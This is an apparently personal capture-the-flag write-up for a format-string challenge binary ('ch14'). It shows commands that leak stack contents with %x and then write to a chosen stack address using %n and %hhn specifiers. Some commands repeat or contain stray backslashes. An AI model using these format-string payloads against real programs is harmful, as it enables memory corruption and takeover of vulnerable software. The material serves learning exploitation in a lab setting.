# Format string bug basic 2 writeup

Used https://www.usna.edu/Users/cs/aviv/classes/si485h/s17/units/06/unit.html as a guide.

First, lets use some simple string to look up into the stack and find our passed in argument.

```sh
./ch14 "AAAA %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x %#08x"

# returns [AAAA 0x80485f1 00000000 00000000 0x0000c2 0xbffffb74 0xb7fe1409 0xf63d4e2e 0x4030201 0x41414141 0x38783020 0x35383430 0x3020316]
# at the 0x41414141 we see our AAAA that we put in there
```

address we want to write to: 
0x bf ff fa 68

./ch14 $(printf "\x68\xfa\xff\xbf").%#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%#08x

We want to write to the address 0xbffffa68. So we put that address as the very first part of our string so that we can refer to it when popping elements off the stack and writing to that address using %n.

The result is:
./ch14 $(printf "\x68\xfa\xff\xbf").%#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%n

which yields us with being on the right way.

Since our buffer size at most is 128, we need to do this by doing this cleverly.

./ch14 $(printf "\x4b\xfa\xff\xbf")$(printf "\x4a\xfa\xff\xbf")$(printf "\x49\xfa\xff\xbf")$(printf "\x48\xfa\xff\xbf")%#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%#146x.%hhn.%hhn

address changed again!
./ch14 $(printf "\x4b\xfa\xff\xbf")$(printf "\x4a\xfa\xff\xbf")$(printf "\x49\xfa\xff\xbf")$(printf "\x48\xfa\xff\xbf")%#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%#146x.%hhn.%hhn

./ch14 $(printf "\x4b\xfa\xff\xbf")$(printf "\x4a\xfa\xff\xbf")$(printf "\x49\xfa\xff\xbf")$(printf "\x48\xfa\xff\xbf").%1\$07x.%9\$hhn.%1\$08x.%\10\$hhn.%1\$08x.%\11\$hhn.%1\$08x.%\12\$hhn

./ch14 $(printf "\x4b\xfa\xff\xbf")$(printf "\x4a\xfa\xff\xbf")$(printf "\x49\xfa\xff\xbf")$(printf "\x48\xfa\xff\xbf").%1\$204x.%9\$hhn.%1\$205x.%\10\$hhn.%1\$15x.%\11\$hhn.%1\$47x.%\12\$hhn

